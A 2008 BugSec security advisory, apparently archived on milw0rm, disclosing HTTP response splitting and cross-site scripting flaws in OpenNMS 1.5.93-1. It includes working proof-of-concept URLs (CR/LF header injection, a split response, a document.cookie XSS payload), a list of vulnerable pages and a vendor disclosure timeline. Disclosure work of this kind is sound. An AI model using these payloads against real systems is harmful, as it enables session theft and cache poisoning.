@@ -1,0 +1,194 @@
+OpenNMS Multiple Vulnerabilities
+--------------------------------
+
+BugSec | Security Advisory
+Moshe Ben-Abu | Security Expert
+
+
+Advisory URL (PDF):
+http://www.bugsec.com/up_files/OpenNMS_Multiple_Vulnerabilities.pdf
+ 
+
+Vendor
+------
+OpenNMS Group  http://www.opennms.com
+OpenNMS Project  http://www.opennms.org
+
+Application Description
+-----------------------
+OpenNMS is the world's first enterprise grade network management
+platform developed under the open source model. It
+consists of a community supported open-source project as well as a
+commercial services, training, and support
+organization. - From OpenNMS Project website.
+
+
+OpenNMS HTTP Response Splitting Vulnerability
+---------------------------------------------
+
+Vulnerability Information
+-------------------------
+Remotely exploitable: Yes
+Locally exploitable: No
+Affected versions:
+OpenNMS 1.5.93-1
+Other versions may also be affected.
+
+Vulnerability Details
+---------------------
+An input validation problem exists within OpenNMS which allows injecting
+CR (carriage return - %0D or \r) and LF
+(line feed - %0A or \n) characters into the server HTTP response header,
+resulting in a HTTP Response Splitting[1]
+vulnerability.
+This vulnerability is possible because the application fails to validate
+user supplied input, returning it
+un-sanitized within the server HTTP response header back to the client.
+This vulnerability not only gives attackers control of the remaining
+headers and body of the server response, but
+also allows them to create additional responses entirely under their
+control.
+Attacker-supplied HTML or JavaScript code could run in the context of
+the affected site, potentially allowing an
+attacker to steal cookie-based authentication credentials, control how
+the site is rendered to the user, and
+influence or misrepresent how web content is served, cached, or
+interpreted. Other attacks are also possible.
+
+
+
+
+
+
+Proof-of-Concept
+----------------
+
+Header injection:
+http://server/opennms/event/query?%0D%0AInjectedHeader:%20BugSec
+
+Server response:
+HTTP/1.1 302 Moved Temporarily
+Date: Thu, 25 Sep 2008 11:30:05 GMT
+Server: Apache/2.2.3
+Location: http://server/opennms/event/list?
+InjectedHeader: BugSec=
+Content-Length: 0
+Connection: close
+Content-Type: text/plain; charset=UTF-8
+
+
+HTTP Response Splitting:
+http://server/opennms/event/query?%0D%0AContent-Length:%200%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text
+/html%0D%0AContent-Length:%2036%0D%0A%0D%0A<html><body>BugSec</body></html><!--
+
+Server response:
+HTTP/1.1 302 Moved Temporarily
+Date: Thu, 25 Sep 2008 11:35:20 GMT
+Server: Apache/2.2.3
+Location: http://server/opennms/event/list?
+Content-Length: 0
+
+HTTP/1.1 200 OK
+Content-Type: text/html
+Content-Length: 36
+
+<html><body>BugSec</body></html><!--=
+Content-Length: 0
+Connection: close
+Content-Type: text/plain; charset=UTF-8
+
+
+ 
+OpenNMS Cross-Site Scripting Vulnerabilities
+--------------------------------------------
+
+Vulnerability Information
+-------------------------
+Remotely exploitable: Yes
+Locally exploitable: No
+Affected versions:
+    OpenNMS 1.5.93-1
+Other versions may also be affected.
+
+Vulnerability Details
+---------------------
+An input validation problem exists within OpenNMS which allows execution
+of arbitrary client-side code resulting in
+a cross-site scripting vulnerability.
+An attacker may leverage cross-site scripting vulnerability to have
+arbitrary script code executed in the browser of
+an unsuspecting user in the context of the affected site. This may
+facilitate the theft of cookie-based
+authentication credentials as well as other attacks.
+
+Proof-of-Concept
+----------------
+
+surveillanceView.htm - viewName
+http://server/opennms/surveillanceView.htm?viewName=<script>alert(document.cookie)</script>
+
+
+Vulnerable pages
+http://server/opennms/asset/modifyAsset
+http://server/opennms/distributedStatusDetails.htm
+http://server/opennms/distributedStatusHistory.htm
+http://server/opennms/event/query
+http://server/opennms/graph/adhoc2.jsp
+http://server/opennms/graph/chooseresource.htm
+http://server/opennms/graph/results.htm
+http://server/opennms/ksc/customView.htm
+http://server/opennms/ksc/formProcMain.htm
+http://server/opennms/notification/browse
+http://server/opennms/notification/list.jsp
+http://server/opennms/outage/list
+http://server/opennms/rtc/category.jsp
+http://server/opennms/statisticsReports/index.htm
+http://server/opennms/statisticsReports/report.htm
+http://server/opennms/surveillanceView.htm
+
+ 
+Security Analysis
+-----------------
+
+Discovery
+---------
+Moshe Ben-Abu
+BugSec LTD. - Security Consulting Company
+http://www.bugsec.com
+
+
+Disclosure Timeline
+-------------------
+25/09/2008  BugSec Security Team notifies OpenNMS team about security
+vulnerabilities discovered in OpenNMS,
+sending security advisory draft.
+25/09/2008  Vendor acknowledgment notification.
+26/09/2008  OpenNMS 1.5.94 released, fixing HTTP response splitting
+vulnerability but not the cross-site scripting
+vulnerabilities.
+01/10/2008  OpenNMS 1.5.96 released, fixing cross-site scripting
+vulnerabilities.
+05/10/2008  Advisory released.
+
+
+About BugSec LTD.
+-----------------
+BugSec Services provide IT & Application Security services for large
+scaled organizations.
+Among services; Penetration Testing, Risk Assessments, Secure Code
+Development and Guidance.
+
+BugSec Solutions develops innovative products and tools which gives
+focused solution to systems data security
+issues, such as Web Application Security, Secure coding and
+Anti-Phishing solution.
+
+
+
+References
+----------
+[1] HTTP Response Splitting, Web Cache Poisoning Attacks, and Related
+Topics by Amit Klein,
+http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf
+
+# milw0rm.com [2008-10-05]
